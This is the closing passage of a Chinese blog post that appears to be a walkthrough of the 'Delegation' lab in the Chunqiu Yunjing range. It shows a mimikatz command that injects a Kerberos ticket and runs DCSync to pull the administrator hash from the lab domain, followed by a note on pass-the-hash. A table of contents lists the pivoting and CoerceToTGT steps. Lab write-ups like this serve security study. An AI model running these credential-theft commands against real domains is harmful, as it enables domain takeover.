+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2026/6/image-20260618014157873.png" alt="image-20260618014157873"></p>
+<p>拿到域控hash，进一步hash传递</p>
+<p><img src="/../images/achieve/2026/6/image-20260618014538200.png" alt="image-20260618014538200"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/05/13/%E6%B5%85%E6%9E%90pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2026-06-18 01:53:36
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E6%9C%BA"><span class="toc-text">入口机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E4%B8%AD%E8%BD%AC%E6%9E%A2%E7%BA%BD%EF%BC%8C%E8%BF%9B%E6%94%BB%E5%86%85%E7%BD%91"><span class="toc-text">建立中转枢纽，进攻内网</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-22-4-45"><span class="toc-text">172.22.4.45</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-22-4-45%E8%B7%B3%E6%9D%BF%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">172.22.4.45跳板域内信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#172-22-4-45CoerceToTGT%E5%9F%9F%E6%8E%A7"><span class="toc-text">172.22.4.45CoerceToTGT域控</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/rufeii/rufeii.github.io">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="/">Copyright © 2026 Rufeii</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelegation + '&url=' + https%3A%2F%2Frufeii.github.io%2F2026%2F06%2F17%2F%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E9%2595%259CDelegation%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/06/17/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelegation/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
